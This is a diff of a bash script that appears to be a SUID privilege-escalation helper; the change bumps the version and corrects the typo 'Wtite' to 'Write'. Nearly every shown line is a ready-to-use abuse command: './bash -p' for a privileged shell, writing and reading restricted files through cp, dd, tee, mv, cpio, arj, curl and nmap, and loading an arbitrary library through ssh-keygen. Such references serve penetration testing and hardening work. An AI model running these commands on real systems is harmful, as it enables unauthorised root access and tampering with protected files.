@@ -16,7 +16,7 @@
 ############################################################################
 
 # Variables
-version="1.1"
+version="1.11"
 releasedate="November 30, 2021"
 updatedate="December 4, 2021"
 suidlist=(ar arj arp as ash atobm awk base32 base64 basenc bash bridge busybox bzip2 capsh cat chmod chown chroot cmp column comm cp cpio cpulimit csh csplit csvtool cupsfilter curl cut dash date dd dialog diff dig dmsetup docker dosbox ed emacs env eqn expand expect file find flock fmt fold gawk gcore gdb gimp grep gtester gzip hd head hexdump highlight hping3 iconv install ionice ip jjs join jq jrunscript ksh ksshell ld.so less logsave look lua make mawk more msgattrib msgcat msgconv msgfilter msgmerge msguniq mv nasm nawk nice nl nmap node nohup od openssl openvpn paste perf perl pg php pr python readelf restic rev rlwrap rsync run-parts rview rvim sed setarch shuf soelim sort sqlite3 ss ssh-keygen ssh-keyscan start-stop-daemon stdbuf strace strings sysctl systemctl tac tail taskset tbl tclsh tee tftp tic time timeout troff ul unexpand uniq unshare update-alternatives uudecode uuencode view vigr vim vimdiff vipw watch wc wget whiptail xargs xmodmap xmore xxd xz zsh zsoelim);
@@ -141,19 +141,19 @@ declare -A suidlibrary=( 	[bash]="Privilege escalation: ./bash -p"
 					./systemctl enable --now \$TF"
 				
 				
-				[cp]="Wtite into the restricted file: echo DATA | ./cp /dev/stdin FILE_TO_WRITE"
-				[arj]="Wtite into the restricted file: TF=\$(mktemp -d); LFILE=file_to_write; LDIR=where_to_write; echo DATA >\"\$TF/\$LFILE\"; ./arj a \"\$TF/a\" \"\$TF/\$LFILE\"; ./arj e \"\$TF/a\" \$LDIR"
-				[cpio]="\n\tRead the restricted file: echo FILE_NAME | ./cpio -R \$UID -dp \$(mktemp -d); cat \"\$(mktemp -d)/FILE_NAME\"\n\tWtite into the restricted file: echo DATA > FILE_TO_WRITE; echo FILE_TO_WRITE | ./cpio -R 0:0 -p DIR_WHERE_TO_WRITE"
-				[curl]="Wtite into the restricted file: ./curl URL -o FILE_TO_WRITE"
-				[dd]="Wtite into the restricted file: echo DATA | ./dd of=FILE_TO_WRITE"
-				[mvdosbox]="Wtite into the restricted file: ./dosbox -c 'mount c /' -c \"echo DATA >c:FILE_TO_WRITE\" -c exit"
-				[mv]="Wtite into the restricted file: LFILE=file_to_write; TF=\$(mktemp); echo \"DATA\" > \$TF; ./mv \$TF \$LFILE"
-				[nmap]="Wtite into the restricted file: ./nmap -oG=FILE_NAME DATA"
-				[shuf]="Wtite into the restricted file: ./shuf -e DATA -o FILE_NAME"
-				[tee]="Wtite into the restricted file: echo DATA | ./tee -a FILE_NAME"
+				[cp]="Write into the restricted file: echo DATA | ./cp /dev/stdin FILE_TO_WRITE"
+				[arj]="Write into the restricted file: TF=\$(mktemp -d); LFILE=file_to_write; LDIR=where_to_write; echo DATA >\"\$TF/\$LFILE\"; ./arj a \"\$TF/a\" \"\$TF/\$LFILE\"; ./arj e \"\$TF/a\" \$LDIR"
+				[cpio]="\n\tRead the restricted file: echo FILE_NAME | ./cpio -R \$UID -dp \$(mktemp -d); cat \"\$(mktemp -d)/FILE_NAME\"\n\tWrite into the restricted file: echo DATA > FILE_TO_WRITE; echo FILE_TO_WRITE | ./cpio -R 0:0 -p DIR_WHERE_TO_WRITE"
+				[curl]="Write into the restricted file: ./curl URL -o FILE_TO_WRITE"
+				[dd]="Write into the restricted file: echo DATA | ./dd of=FILE_TO_WRITE"
+				[mvdosbox]="Write into the restricted file: ./dosbox -c 'mount c /' -c \"echo DATA >c:FILE_TO_WRITE\" -c exit"
+				[mv]="Write into the restricted file: LFILE=file_to_write; TF=\$(mktemp); echo \"DATA\" > \$TF; ./mv \$TF \$LFILE"
+				[nmap]="Write into the restricted file: ./nmap -oG=FILE_NAME DATA"
+				[shuf]="Write into the restricted file: ./shuf -e DATA -o FILE_NAME"
+				[tee]="Write into the restricted file: echo DATA | ./tee -a FILE_NAME"
 				[ssh-keygen]="It loads shared libraries that may be used to run code in the binary execution context: ./ssh-keygen -D ./lib.so"
 				[update-alternatives]="Write in file: LFILE=/path/to/file_to_write; TF=\$(mktemp); echo DATA >\$TF; ./update-alternatives --force --install \"\$LFILE\" x \"\$TF\" 0"
-				[vipw]="Wtite into the restricted file: ./vipw"
+				[vipw]="Write into the restricted file: ./vipw"
 				
 				
 				[cat]="Read the restricted file: ./cat FILE_NAME"
